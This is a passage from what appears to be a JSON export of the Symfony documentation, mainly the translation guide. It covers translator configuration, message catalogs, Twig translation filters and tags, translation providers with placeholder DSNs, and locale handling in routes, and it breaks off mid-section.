https://docs.phpunit.de/en/10.5/configuration.html\n.. _`unit test`: https://en.wikipedia.org/wiki/Unit_testing\n.. _`DAMADoctrineTestBundle`: https://github.com/dmaicher/doctrine-test-bundle\n.. _`Doctrine data fixtures`: https://symfony.com/doc/current/bundles/DoctrineFixturesBundle/index.html\n.. _`DoctrineFixturesBundle documentation`: https://symfony.com/doc/current/bundles/DoctrineFixturesBundle/index.html\n.. _`SymfonyMakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n.. _`PHPUnit Assertion`: https://docs.phpunit.de/en/10.3/assertions.html\n.. _`section 4.1.18 of RFC 3875`: https://tools.ietf.org/html/rfc3875#section-4.1.18\n"
        },
        {
          "name": "testing",
          "type": "tree",
          "content": null
        },
        {
          "name": "translation.rst",
          "type": "blob",
          "size": 60.1884765625,
          "content": "Translations\n============\n\nThe term \"internationalization\" (often abbreviated `i18n`_) refers to the\nprocess of abstracting strings and other locale-specific pieces out of your\napplication into a layer where they can be translated and converted based\non the user's locale (i.e. language and country). For text, this means\nwrapping each with a function capable of translating the text (or \"message\")\ninto the language of the user::\n\n    // text will *always* print out in English\n    echo 'Hello World';\n\n    // text can be translated into the end-user's language or\n    // default to English\n    echo $translator->trans('Hello World');\n\n.. note::\n\n    The term *locale* refers roughly to the user's language and country. It\n    can be any string that your application uses to manage translations and\n    other format differences (e.g. currency format). The `ISO 639-1`_\n    *language* code, an underscore (``_``), then the `ISO 3166-1 alpha-2`_\n    *country* code (e.g. ``fr_FR`` for French/France) is recommended.\n\nTranslations can be organized into groups, called **domains**. By default, all\nmessages use the default ``messages`` domain::\n\n    echo $translator->trans('Hello World', domain: 'messages');\n\nThe translation process has several steps:\n\n#. :ref:`Enable and configure <translation-configuration>` Symfony's\n   translation service;\n\n#. Abstract strings (i.e. \"messages\") by :ref:`wrapping them in calls\n   <translation-basic>` to the ``Translator``;\n\n#. :ref:`Create translation resources/files <translation-resources>`\n   for each supported locale that translate each message in the application;\n\n#. Determine, :ref:`set and manage the user's locale <translation-locale>`\n   for the request and optionally\n   :ref:`on the user's entire session <locale-sticky-session>`.\n\nInstallation\n------------\n\nFirst, run this command to install the translator before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/translation\n\n.. _translation-configuration:\n\nConfiguration\n-------------\n\nThe previous command creates an initial config file where you can define the\ndefault locale of the application and the directory where the translation files\nare located:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/translation.yaml\n        framework:\n            default_locale: 'en'\n            translator:\n                default_path: '%kernel.project_dir%/translations'\n\n    .. code-block:: xml\n\n        <!-- config/packages/translation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config default-locale=\"en\">\n                <framework:translator\n                    default-path=\"%kernel.project_dir%/translations\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/translation.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework\n                ->defaultLocale('en')\n                ->translator()\n                    ->defaultPath('%kernel.project_dir%/translations')\n            ;\n        };\n\n.. tip::\n\n    You can also define the :ref:`enabled_locales option <reference-translator-enabled-locales>`\n    to restrict the locales that your application is available in.\n\n.. _translation-basic:\n\nBasic Translation\n-----------------\n\nTranslation of text is done through the ``translator`` service\n(:class:`Symfony\\\\Component\\\\Translation\\\\Translator`). To translate a block of\ntext (called a *message*), use the\n:method:`Symfony\\\\Component\\\\Translation\\\\Translator::trans` method. Suppose,\nfor example, that you're translating a static message from inside a\ncontroller::\n\n    // ...\n    use Symfony\\Contracts\\Translation\\TranslatorInterface;\n\n    public function index(TranslatorInterface $translator): Response\n    {\n        $translated = $translator->trans('Symfony is great');\n\n        // ...\n    }\n\n.. _translation-resources:\n\nWhen this code is run, Symfony will attempt to translate the message\n\"Symfony is great\" based on the ``locale`` of the user. For this to work,\nyou need to tell Symfony how to translate the message via a \"translation\nresource\", which is usually a file that contains a collection of translations\nfor a given locale. This \"dictionary\" of translations can be created in several\ndifferent formats:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # translations/messages.fr.yaml\n        Symfony is great: J'aime Symfony\n\n    .. code-block:: xml\n\n        <!-- translations/messages.fr.xlf -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <xliff version=\"1.2\" xmlns=\"urn:oasis:names:tc:xliff:document:1.2\">\n            <file source-language=\"en\" datatype=\"plaintext\" original=\"file.ext\">\n                <body>\n                    <trans-unit id=\"symfony_is_great\">\n                        <source>Symfony is great</source>\n                        <target>J'aime Symfony</target>\n                    </trans-unit>\n                </body>\n            </file>\n        </xliff>\n\n    .. code-block:: php\n\n        // translations/messages.fr.php\n        return [\n            'Symfony is great' => \"J'aime Symfony\",\n        ];\n\nYou can find more information on where these files\n:ref:`should be located <translation-resource-locations>`.\n\nNow, if the language of the user's locale is French (e.g. ``fr_FR`` or ``fr_BE``),\nthe message will be translated into ``J'aime Symfony``. You can also translate\nthe message inside your :ref:`templates <translation-in-templates>`.\n\n.. _translation-real-vs-keyword-messages:\n\nUsing Real or Keyword Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis example illustrates the two different philosophies when creating\nmessages to be translated::\n\n    $translator->trans('Symfony is great');\n\n    $translator->trans('symfony.great');\n\nIn the first method, messages are written in the language of the default\nlocale (English in this case). That message is then used as the \"id\"\nwhen creating translations.\n\nIn the second method, messages are actually \"keywords\" that convey the\nidea of the message. The keyword message is then used as the \"id\" for\nany translations. In this case, translations must be made for the default\nlocale (i.e. to translate ``symfony.great`` to ``Symfony is great``).\n\nThe second method is handy because the message key won't need to be changed\nin every translation file if you decide that the message should actually\nread \"Symfony is really great\" in the default locale.\n\nThe choice of which method to use is entirely up to you, but the \"keyword\"\nformat is often recommended for multi-language applications, whereas for\nshared bundles that contain translation resources we recommend the real\nmessage, so your application can choose to disable the translator layer\nand you will see a readable message.\n\nAdditionally, the ``php`` and ``yaml`` file formats support nested ids to\navoid repeating yourself if you use keywords instead of real text for your\nids:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        symfony:\n            is:\n                # id is symfony.is.great\n                great: Symfony is great\n                # id is symfony.is.amazing\n                amazing: Symfony is amazing\n            has:\n                # id is symfony.has.bundles\n                bundles: Symfony has bundles\n        user:\n            # id is user.login\n            login: Login\n\n    .. code-block:: php\n\n        [\n            'symfony' => [\n                'is' => [\n                    // id is symfony.is.great\n                    'great'   => 'Symfony is great',\n                    // id is symfony.is.amazing\n                    'amazing' => 'Symfony is amazing',\n                ],\n                'has' => [\n                    // id is symfony.has.bundles\n                    'bundles' => 'Symfony has bundles',\n                ],\n            ],\n            'user' => [\n                // id is user.login\n                'login' => 'Login',\n            ],\n        ];\n\nThe Translation Process\n~~~~~~~~~~~~~~~~~~~~~~~\n\nTo actually translate the message, Symfony uses the following process when\nusing the ``trans()`` method:\n\n#. The ``locale`` of the current user, which is stored on the request is\n   determined; this is typically set via a ``_locale`` :ref:`attribute on\n   your routes <translation-locale-url>`;\n\n#. A catalog of translated messages is loaded from translation resources\n   defined for the ``locale`` (e.g. ``fr_FR``). Messages from the\n   :ref:`fallback locale <translation-fallback>` and the\n   :ref:`enabled locales <reference-translator-enabled-locales>` are also\n   loaded and added to the catalog if they don't already exist. The end result\n   is a large \"dictionary\" of translations.\n\n#. If the message is located in the catalog, the translation is returned. If\n   not, the translator returns the original message.\n\n.. _message-placeholders:\n.. _pluralization:\n\nMessage Format\n--------------\n\nSometimes, a message containing a variable needs to be translated::\n\n    // ...\n    $translated = $translator->trans('Hello '.$name);\n\nHowever, creating a translation for this string is impossible since the\ntranslator will try to look up the message including the variable portions\n(e.g. *\"Hello Ryan\"* or *\"Hello Fabien\"*).\n\nAnother complication is when you have translations that may or may not be\nplural, based on some variable:\n\n.. code-block:: text\n\n    There is one apple.\n    There are 5 apples.\n\nTo manage these situations, Symfony follows the `ICU MessageFormat`_ syntax by\nusing PHP's :phpclass:`MessageFormatter` class. Read more about this in\n:doc:`/reference/formats/message_format`.\n\n.. _translatable-objects:\n\nTranslatable Objects\n--------------------\n\nSometimes translating contents in templates is cumbersome because you need the\noriginal message, the translation parameters and the translation domain for\neach content. Making the translation in the controller or services simplifies\nyour templates, but requires injecting the translator service in different\nparts of your application and mocking it in your tests.\n\nInstead of translating a string at the time of creation, you can use a\n\"translatable object\", which is an instance of the\n:class:`Symfony\\\\Component\\\\Translation\\\\TranslatableMessage` class. This object stores\nall the information needed to fully translate its contents when needed::\n\n    use Symfony\\Component\\Translation\\TranslatableMessage;\n\n    // the first argument is required and it's the original message\n    $message = new TranslatableMessage('Symfony is great!');\n    // the optional second argument defines the translation parameters and\n    // the optional third argument is the translation domain\n    $status = new TranslatableMessage('order.status', ['%status%' => $order->getStatus()], 'store');\n\nTemplates are now much simpler because you can pass translatable objects to the\n``trans`` filter:\n\n.. code-block:: html+twig\n\n    <h1>{{ message|trans }}</h1>\n    <p>{{ status|trans }}</p>\n\n.. tip::\n\n    The translation parameters can also be a :class:`Symfony\\\\Component\\\\Translation\\\\TranslatableMessage`.\n\n.. tip::\n\n    There's also a :ref:`function called t() <reference-twig-function-t>`,\n    available both in Twig and PHP, as a shortcut to create translatable objects.\n\n.. _translation-in-templates:\n\nTranslations in Templates\n-------------------------\n\nMost of the time, translation occurs in templates. Symfony provides native\nsupport for both Twig and PHP templates.\n\n.. _translation-filters:\n\nUsing Twig Filters\n~~~~~~~~~~~~~~~~~~\n\nThe ``trans`` filter can be used to translate *variable texts* and complex expressions:\n\n.. code-block:: twig\n\n    {{ message|trans }}\n\n    {{ message|trans({'%name%': 'Fabien'}, 'app') }}\n\n.. tip::\n\n    You can set the translation domain for an entire Twig template with a single tag:\n\n    .. code-block:: twig\n\n       {% trans_default_domain 'app' %}\n\n    Note that this only influences the current template, not any \"included\"\n    template (in order to avoid side effects).\n\nBy default, the translated messages are output escaped; apply the ``raw``\nfilter after the translation filter to avoid the automatic escaping:\n\n.. code-block:: html+twig\n\n    {% set message = '<h3>foo</h3>' %}\n\n    {# strings and variables translated via a filter are escaped by default #}\n    {{ message|trans|raw }}\n    {{ '<h3>bar</h3>'|trans|raw }}\n\n.. _translation-tags:\n\nUsing Twig Tags\n~~~~~~~~~~~~~~~\n\nSymfony provides a specialized Twig tag ``trans`` to help with message\ntranslation of *static blocks of text*:\n\n.. code-block:: twig\n\n    {% trans %}Hello %name%{% endtrans %}\n\n.. warning::\n\n    The ``%var%`` notation of placeholders is required when translating in\n    Twig templates using the tag.\n\n.. tip::\n\n    If you need to use the percent character (``%``) in a string, escape it by\n    doubling it: ``{% trans %}Percent: %percent%%%{% endtrans %}``\n\nYou can also specify the message domain and pass some additional variables:\n\n.. code-block:: twig\n\n    {% trans with {'%name%': 'Fabien'} from 'app' %}Hello %name%{% endtrans %}\n\n    {% trans with {'%name%': 'Fabien'} from 'app' into 'fr' %}Hello %name%{% endtrans %}\n\n.. warning::\n\n    Using the translation tag has the same effect as the filter, but with one\n    major difference: automatic output escaping is **not** applied to translations\n    using a tag.\n\nForcing the Translator Locale\n-----------------------------\n\nWhen translating a message, the translator uses the specified locale or the\n``fallback`` locale if necessary. You can also manually specify the locale to\nuse for translation::\n\n    $translator->trans('Symfony is great', locale: 'fr_FR');\n\nExtracting Translation Contents and Updating Catalogs Automatically\n-------------------------------------------------------------------\n\nThe most time-consuming task when translating an application is to extract all\nthe template contents to be translated and to keep all the translation files in\nsync. Symfony includes a command called ``translation:extract`` that helps you\nwith these tasks:\n\n.. code-block:: terminal\n\n    # shows all the messages that should be translated for the French language\n    $ php bin/console translation:extract --dump-messages fr\n\n    # updates the French translation files with the missing strings for that locale\n    $ php bin/console translation:extract --force fr\n\n    # check out the command help to see its options (prefix, output format, domain, sorting, etc.)\n    $ php bin/console translation:extract --help\n\nThe ``translation:extract`` command looks for missing translations in:\n\n* Templates stored in the ``templates/`` directory (or any other directory\n  defined in the :ref:`twig.default_path <config-twig-default-path>` and\n  :ref:`twig.paths <config-twig-paths>` config options);\n* Any PHP file/class that injects or :doc:`autowires </service_container/autowiring>`\n  the ``translator`` service and makes calls to the ``trans()`` method;\n* Any PHP file/class stored in the ``src/`` directory that creates\n  :ref:`translatable objects <translatable-objects>` using the constructor or\n  the ``t()`` method or calls the ``trans()`` method;\n* Any PHP file/class stored in the ``src/`` directory that uses\n  :ref:`Constraints Attributes <validation-constraints>`  with ``*message`` named argument(s).\n\n.. tip::\n\n    Install the ``nikic/php-parser`` package in your project to improve the\n    results of the ``translation:extract`` command. This package enables an\n    `AST`_ parser that can find many more translatable items:\n\n    .. code-block:: terminal\n\n        $ composer require nikic/php-parser\n\nBy default, when the ``translation:extract`` command creates new entries in the\ntranslation file, it uses the same content as both the source and the pending\ntranslation. The only difference is that the pending translation is prefixed by\n``__``. You can customize this prefix using the ``--prefix`` option:\n\n.. code-block:: terminal\n\n    $ php bin/console translation:extract --force --prefix=\"NEW_\" fr\n\n.. _translation-resource-locations:\n\nTranslation Resource/File Names and Locations\n---------------------------------------------\n\nSymfony looks for message files (i.e. translations) in the following default locations:\n\n* the ``translations/`` directory (at the root of the project);\n* the ``translations/`` directory inside of any bundle (and also their\n  ``Resources/translations/`` directory, which is no longer recommended for bundles).\n\nThe locations are listed here with the highest priority first. That is, you can\noverride the translation messages of a bundle in the first directory.\n\nThe override mechanism works at a key level: only the overridden keys need\nto be listed in a higher priority message file. When a key is not found\nin a message file, the translator will automatically fall back to the lower\npriority message files.\n\nThe filename of the translation files is also important: each message file\nmust be named according to the following path: ``domain.locale.loader``:\n\n* **domain**: The translation domain;\n\n* **locale**: The locale that the translations are for (e.g. ``en_GB``, ``en``, etc);\n\n* **loader**: How Symfony should load and parse the file (e.g. ``xlf``,\n  ``php``, ``yaml``, etc).\n\nThe loader can be the name of any registered loader. By default, Symfony\nprovides many loaders which are selected based on the following file extensions:\n\n* ``.yaml``: YAML file (you can also use the ``.yml`` file extension);\n* ``.xlf``: XLIFF file (you can also use the ``.xliff`` file extension);\n* ``.php``: a PHP file that returns an array with the translations;\n* ``.csv``: CSV file;\n* ``.json``: JSON file;\n* ``.ini``: INI file;\n* ``.dat``, ``.res``: `ICU resource bundle`_;\n* ``.mo``: `Machine object format`_;\n* ``.po``: `Portable object format`_;\n* ``.qt``: `QT Translations TS XML`_ file;\n\nThe choice of which loader to use is entirely up to you and is a matter of\ntaste. The recommended option is to use YAML for simple projects and use XLIFF\nif you're generating translations with specialized programs or teams.\n\n.. warning::\n\n    Each time you create a *new* message catalog (or install a bundle\n    that includes a translation catalog), be sure to clear your cache so\n    that Symfony can discover the new translation resources:\n\n    .. code-block:: terminal\n\n        $ php bin/console cache:clear\n\n.. note::\n\n    You can add other directories with the :ref:`paths <reference-translator-paths>`\n    option in the configuration:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/packages/translation.yaml\n            framework:\n                translator:\n                    paths:\n                        - '%kernel.project_dir%/custom/path/to/translations'\n\n        .. code-block:: xml\n\n            <!-- config/packages/translation.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-Instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\n                    http://symfony.com/schema/dic/symfony\n                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n                <framework:config>\n                    <framework:translator>\n                        <framework:path>%kernel.project_dir%/custom/path/to/translations</framework:path>\n                    </framework:translator>\n                </framework:config>\n            </container>\n\n        .. code-block:: php\n\n            // config/packages/translation.php\n            use Symfony\\Config\\FrameworkConfig;\n\n            return static function (FrameworkConfig $framework): void {\n                $framework->translator()\n                    ->paths(['%kernel.project_dir%/custom/path/to/translations'])\n                ;\n            };\n\nTranslations of Doctrine Entities\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUnlike the contents of templates, it's not practical to translate the contents\nstored in Doctrine Entities using translation catalogs. Instead, use the\nDoctrine `Translatable Extension`_ or the `Translatable Behavior`_. For more\ninformation, read the documentation of those libraries.\n\nCustom Translation Resources\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your translations use a format not supported by Symfony or you store them\nin a special way (e.g. not using files or Doctrine entities), you need to provide\na custom class implementing the :class:`Symfony\\\\Component\\\\Translation\\\\Loader\\\\LoaderInterface`\ninterface. See the :ref:`dic-tags-translation-loader` tag for more information.\n\n.. _translation-providers:\n\nTranslation Providers\n---------------------\n\nWhen using external translators to translate your application, you must send\nthem the new contents to translate frequently and merge the results back in the\napplication.\n\nInstead of doing this manually, Symfony provides integration with several\nthird-party translation services. You can upload and download (called \"push\"\nand \"pull\") translations to/from these services and merge the results\nautomatically in the application.\n\nInstalling and Configuring a Third Party Provider\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBefore pushing/pulling translations to a third-party provider, you must install\nthe package that provides integration with that provider:\n\n======================  ===========================================================\nProvider                Install with\n======================  ===========================================================\n`Crowdin`_              ``composer require symfony/crowdin-translation-provider``\n`Loco (localise.biz)`_  ``composer require symfony/loco-translation-provider``\n`Lokalise`_             ``composer require symfony/lokalise-translation-provider``\n`Phrase`_                ``composer require symfony/phrase-translation-provider``\n======================  ===========================================================\n\nEach library includes a :ref:`Symfony Flex recipe <symfony-flex>` that will add\na configuration example to your ``.env`` file. For example, suppose you want to\nuse Loco. First, install it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/loco-translation-provider\n\nYou'll now have a new line in your ``.env`` file that you can uncomment:\n\n.. code-block:: env\n\n    # .env\n    LOCO_DSN=loco://API_KEY@default\n\nThe ``LOCO_DSN`` isn't a *real* address: it's a convenient format that offloads\nmost of the configuration work to Symfony. The ``loco`` scheme activates the\nLoco provider that you just installed, which knows all about how to push and\npull translations via Loco. The *only* part you need to change is the\n``API_KEY`` placeholder.\n\nThis table shows the full list of available DSN formats for each provider:\n\n======================  ==============================================================\nProvider                DSN\n======================  ==============================================================\n`Crowdin`_              ``crowdin://PROJECT_ID:API_TOKEN@ORGANIZATION_DOMAIN.default``\n`Loco (localise.biz)`_  ``loco://API_KEY@default``\n`Lokalise`_             ``lokalise://PROJECT_ID:API_KEY@default``\n`Phrase`_               ``phrase://PROJECT_ID:API_TOKEN@default?userAgent=myProject``\n======================  ==============================================================\n\nTo enable a translation provider, customize the DSN in your ``.env`` file and\nconfigure the ``providers`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/translation.yaml\n        framework:\n            translator:\n                providers:\n                    loco:\n                        dsn: '%env(LOCO_DSN)%'\n                        domains: ['messages']\n                        locales: ['en', 'fr']\n\n    .. code-block:: xml\n\n        <!-- config/packages/translation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:translator>\n                    <framework:provider name=\"loco\" dsn=\"%env(LOCO_DSN)%\">\n                        <framework:domain>messages</framework:domain>\n                        <!-- ... -->\n                        <framework:locale>en</framework:locale>\n                        <framework:locale>fr</framework:locale>\n                        <!-- ... -->\n                    </framework:provider>\n                </framework:translator>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        # config/packages/translation.php\n        $container->loadFromExtension('framework', [\n            'translator' => [\n                'providers' => [\n                    'loco' => [\n                        'dsn' => env('LOCO_DSN'),\n                        'domains' => ['messages'],\n                        'locales' => ['en', 'fr'],\n                    ],\n                ],\n            ],\n        ]);\n\n.. important::\n\n    If you use Phrase as a provider you must configure a user agent in your dsn. See\n    `Identification via User-Agent`_ for reasoning and some examples.\n\n    Also make the locale _names_ in Phrase should be as defined in RFC4646 (e.g. pt-BR rather than pt_BR).\n    Not doing so will result in Phrase creating a new locale for the imported keys.\n\n.. tip::\n\n    If you use Crowdin as a provider and some of your locales are different from\n    the `Crowdin Language Codes`_, you have to set the `Custom Language Codes`_ in the Crowdin project\n    for each of your locales, in order to override the default value. You need to select the\n    \"locale\" placeholder and specify the custom code in the \"Custom Code\" field.\n\n.. tip::\n\n    If you use Lokalise as a provider and a locale format following the `ISO\n    639-1`_ (e.g. \"en\" or \"fr\"), you have to set the `Custom Language Name setting`_\n    in Lokalise for each of your locales, in order to override the\n    default value (which follow the `ISO 639-1`_ succeeded by a sub-code in\n    capital letters that specifies the national variety (e.g. \"GB\" or \"US\"\n    according to `ISO 3166-1 alpha-2`_)).\n\n.. tip::\n\n    The Phrase provider uses Phrase's tag feature to map translations to Symfony's translation\n    domains. If you need some assistance with organising your tags in Phrase, you might want\n    to consider the `Phrase Tag Bundle`_ which provides some commands helping you with that.\n\nPushing and Pulling Translations\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAfter configuring the credentials to access the translation provider, you can\nnow use the following commands to push (upload) and pull (download) translations:\n\n.. code-block:: terminal\n\n    # push all local translations to the Loco provider for the locales and domains\n    # configured in config/packages/translation.yaml file.\n    # it will update existing translations already on the provider.\n    $ php bin/console translation:push loco --force\n\n    # push new local translations to the Loco provider for the French locale\n    # and the validators domain.\n    # it will **not** update existing translations already on the provider.\n    $ php bin/console translation:push loco --locales fr --domains validators\n\n    # push new local translations and delete provider's translations that not\n    # exists anymore in local files for the French locale and the validators domain.\n    # it will **not** update existing translations already on the provider.\n    $ php bin/console translation:push loco --delete-missing --locales fr --domains validators\n\n    # check out the command help to see its options (format, domains, locales, etc.)\n    $ php bin/console translation:push --help\n\n.. code-block:: terminal\n\n    # pull all provider's translations to local files for the locales and domains\n    # configured in config/packages/translation.yaml file.\n    # it will overwrite completely your local files.\n    $ php bin/console translation:pull loco --force\n\n    # pull new translations from the Loco provider to local files for the French\n    # locale and the validators domain.\n    # it will **not** overwrite your local files, only add new translations.\n    $ php bin/console translation:pull loco --locales fr --domains validators\n\n    # check out the command help to see its options (format, domains, locales, intl-icu, etc.)\n    $ php bin/console translation:pull --help\n\n    # the \"--as-tree\" option will write YAML messages as a tree-like structure instead\n    # of flat keys\n    $ php bin/console translation:pull loco --force --as-tree\n\nCreating Custom Providers\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn addition to using Symfony's built-in translation providers, you can create\nyour own providers. To do so, you need to create two classes:\n\n#. The first class must implement :class:`Symfony\\\\Component\\\\Translation\\\\Provider\\\\ProviderInterface`;\n#. The second class needs to be a factory which will create instances of the first class. It must implement\n:class:`Symfony\\\\Component\\\\Translation\\\\Provider\\\\ProviderFactoryInterface` (you can extend :class:`Symfony\\\\Component\\\\Translation\\\\Provider\\\\AbstractProviderFactory` to simplify its creation).\n\nAfter creating these two classes, you need to register your factory as a service\nand tag it with :ref:`translation.provider_factory <reference-dic-tags-translation-provider-factory>`.\n\n.. _translation-locale:\n\nHandling the User's Locale\n--------------------------\n\nTranslating happens based on the user's locale. The locale of the current user\nis stored in the request and is accessible via the ``Request`` object::\n\n    use Symfony\\Component\\HttpFoundation\\Request;\n\n    public function index(Request $request): void\n    {\n        $locale = $request->getLocale();\n    }\n\nTo set the user's locale, you may want to create a custom event listener so\nthat it's set before any other parts of the system (i.e. the translator) need\nit::\n\n        public function onKernelRequest(RequestEvent $event): void\n        {\n            $request = $event->getRequest();\n\n            // some logic to determine the $locale\n            $request->setLocale($locale);\n        }\n\n.. note::\n\n    The custom listener must be called **before** ``LocaleListener``, which\n    initializes the locale based on the current request. To do so, set your\n    listener priority to a higher value than ``LocaleListener`` priority (which\n    you can obtain by running the ``debug:event kernel.request`` command).\n\nRead :ref:`locale-sticky-session` for more information on making the user's\nlocale \"sticky\" to their session.\n\n.. note::\n\n    Setting the locale using ``$request->setLocale()`` in the controller is\n    too late to affect the translator. Either set the locale via a listener\n    (like above), the URL (see next) or call ``setLocale()`` directly on the\n    ``translator`` service.\n\nSee the :ref:`translation-locale-url` section below about setting the\nlocale via routing.\n\n.. _translation-locale-url:\n\nThe Locale and the URL\n~~~~~~~~~~~~~~~~~~~~~~\n\nSince you can store the locale of the user in the session, it may be tempting\nto use the same URL to display a resource in different languages based on the\nuser's locale. For example, ``http://www.example.com/contact`` could show\ncontent in English for one user and French for another user. Unfortunately,\nthis violates a fundamental rule of the Web: that a particular URL returns the\nsame resource regardless of the user. To further muddy the problem, which\nversion of the content would be indexed by search engines?\n\nA better policy is to include the locale in the URL using the\n:ref:`special _locale parameter <routing-locale-parameter>`:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/ContactController.php\n        namespace App\\Controller;\n\n        // ...\n        class ContactController extends AbstractController\n        {\n            #[Route(\n                path: '/{_locale}/contact',\n                name: 'contact',\n                requirements: [\n                    '_locale' => 'en|fr|de',\n                ],\n            )]\n            public function contact(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        contact:\n            path:       /{_locale}/contact\n            controller: App\\Controller\\ContactController::index\n            requirements:\n                _locale: en|fr|de\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"contact\" path=\"/{_locale}/contact\">\n                controller=\"App\\Controller\\ContactController::index\">\n                <requirement key=\"_locale\">en|fr|de</requirement>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\ContactController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('contact', '/{_locale}/contact')\n                ->controller([ContactController::class, 'index'])\n                ->requirements([\n                    '_locale' => 'en|fr|de',\n                ])\n            ;\n        };\n\nWhen using the special ``_locale`` parameter in a route, the matched locale\nis *automatically set on the Request* and can be retrieved via the\n:method:`Symfony\\\\Component\\\\HttpFoundation\\\\Request::getLocale` method. In\nother words, if a user visits the URI ``/fr/contact``, the locale ``fr`` will\nautomatically be set as the locale for the current request.\n\nYou can now use the locale to create routes to other translated pages in your\napplication.\n\n.. tip::\n\n    Define the locale requirement as a :ref:`container parameter <configuration-parameters>`\n    to avoid hardcoding its value in all your routes.\n\n.. _translation-default-locale:\n\nSetting a Default Locale\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhat if the user's locale hasn't been determined? You can guarantee that a\nlocale is set on each user's request by defining a ``default_locale`` for\nthe framework:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/translation.yaml\n        framework:\n            default_locale: en\n\n    .. code-block:: xml\n\n        <!-- config/packages/translation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config default-locale=\"en\"/>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/translation.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->defaultLocale('en');\n        };\n\nThis ``default_locale`` is also relevant for the translator, as shown in the\nnext section.\n\nSelecting the Language Preferred by the User\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your application supports multiple languages, the first time a user visits your\nsite it's common to redirect them to the best possible language according to their\npreferences. This is achieved with the ``getPreferredLanguage()`` method of the\n:ref:`Request object <controller-request-argument>`::\n\n    // get the Request object somehow (e.g. as a controller argument)\n    $request = ...\n    // pass an array of the locales (their script and region parts are optional) supported\n    // by your application and the method returns the best locale for the current user\n    $locale = $request->getPreferredLanguage(['pt', 'fr_Latn_CH', 'en_US'] );\n\nSymfony finds the best possible language based on the locales passed as argument\nand the value of the ``Accept-Language`` HTTP header. If it can't find a perfect\nmatch between them, Symfony will try to find a partial match based on the language\n(e.g. ``fr_CA`` would match ``fr_Latn_CH`` because their language is the same).\nIf there's no perfect or partial match, this method returns the first locale passed\nas argument (that's why the order of the passed locales is important).\n\n.. versionadded:: 7.1\n\n    The feature to match locales partially was introduced in Symfony 7.1.\n\n.. _translation-fallback:\n\nFallback Translation Locales\n----------------------------\n\nImagine that the user's locale is ``es_AR`` and that you're translating the\nkey ``Symfony is great``. To find the Spanish translation, Symfony actually\nchecks translation resources for several locales:\n\n#. First, 